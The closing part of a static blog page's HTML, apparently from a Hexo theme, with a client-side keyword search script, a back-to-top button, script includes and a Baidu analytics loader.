                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    var cnt = 1;
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var content_index = [];
                        var data_title_origin = data.title.trim();
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + String(cnt) + ". " + data_title_origin + "</a>";
                            cnt += 1;
    
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 300 characters
                                var start = first_occur - 30;
                                if (start < 0) {
                                    start = 0;
                                }
                                var match_content = content.substr(start, 300);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });
    
                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    str = "<p class=\"search-result-summary\">共找到 " + String(cnt-1) + " 条结果</p>"  + str;
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.min.js"></script>

    

    
<script>
    var _hmt = _hmt || [];
    (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?40e312a1eec109cf96e30988cf3bfe70";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();
</script>

    
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
